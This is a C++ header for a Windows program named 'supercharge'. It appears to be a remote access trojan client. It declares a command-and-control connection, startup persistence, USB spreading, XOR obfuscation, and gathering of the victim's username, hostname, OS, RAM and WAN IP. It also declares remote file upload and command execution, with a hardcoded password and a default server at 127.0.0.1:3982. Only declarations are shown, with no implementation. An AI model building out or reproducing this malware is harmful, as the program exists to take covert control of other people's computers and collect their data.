/*
 
 supercharge Main Header file.
 
*/

#ifndef supercharge_
#define supercharge_


#include "xor.hpp"
#include "install.hpp"
#include "usbb.hpp"
#include "fs.hpp"
#include "window.hpp"
#include "bsysinfo.hpp"
#include <windows.h>
#include <wininet.h>
#include <lmcons.h>
#include <tchar.h>
#include <cstring>
#include <sstream>
#include <iostream>
#include <cstdio>

#define NTSTATUS LONG
#define BUFFER 1024
#define INTERVAL 5000
#define MAX_PASSWORD 100
#define OKCODE 21 

#define PASSWORD "mysecretpassword" 

// Default
#define SERVER_HOST "127.0.0.1"
#define SERVER_PORT 3982 


static bool connected = false;
static bool authenticated = false;

class supercharge {
public:
	HANDLE hThread;
	DWORD ProcessId(LPCTSTR ProcessName);
	char password_buf[MAX_PASSWORD];
	char passes[MAX_PASSWORD];
	char username[UNLEN + 1];
	char hostname[MAX_COMPUTERNAME_LENGTH + 1];
	TCHAR DIR[MAX_PATH];
	DWORD len = UNLEN + 1;
	DWORD hlen = sizeof(hostname) / sizeof(hostname[0]);
	char wanip[500];
	char DIRFILES[BUFFER];
	WIN32_FIND_DATA data;
	SOCKET sockfd;
	char recvbuf[BUFFER];
	char* file_commands[5];
	char* dir_commands[5];
	char* msgbox[5];
	char* fcommands[5];
	char* audio[5];
	char* cmd[5];
	char filebuf[BUFFER];
	struct sockaddr_in server;
	void strsplit(char src[500], char* dest[5]);
	void C2Connect();
	void ConnectionManage();
	void respond(const char* data);
	bool isUsbThreadRunning();
	void respondF(const char* data);
	std::string OS();
	std::string ramsize(int mode);
	std::string USERPC();
	std::string AgentLocation();
	void Wanip();
	void recvFile();
	void ExecuteFile(char* filename);
	void Execute(char* toExecute);
	void startup();
	void reconnect();
};



#endif
